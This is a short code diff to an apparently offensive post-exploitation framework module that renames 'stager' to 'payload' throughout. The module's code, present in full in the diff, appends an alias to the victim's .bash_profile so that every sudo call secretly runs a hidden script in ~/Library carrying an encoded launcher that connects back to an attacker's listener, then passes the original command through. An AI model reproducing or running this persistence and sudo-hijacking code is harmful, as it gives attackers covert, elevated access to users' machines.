@@ -11,7 +11,7 @@ class Module:
             'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': 'Creates an alias in the .bash_profile to cause the sudo command to execute a stager and pass through the origional command back to sudo',
+            'Description': 'Creates an alias in the .bash_profile to cause the sudo command to execute a payload and pass through the origional command back to sudo',
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -83,7 +83,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
         launcher = launcher.replace('"', '\\"')
         script = '''
 import os
@@ -95,10 +95,10 @@ bashlocation = home + "/Library/." + randomStr + ".sh"
 with open(home + "/.bash_profile", "a") as profile:
     profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
 launcher = "%s"
-stager = "#!/bin/bash\\n"
-stager += launcher
+payload = "#!/bin/bash\\n"
+payload += launcher
 with open(bashlocation, 'w') as f:
-    f.write(stager)
+    f.write(payload)
     f.close()
 os.chmod(bashlocation, 0755)
 ''' % (launcher)
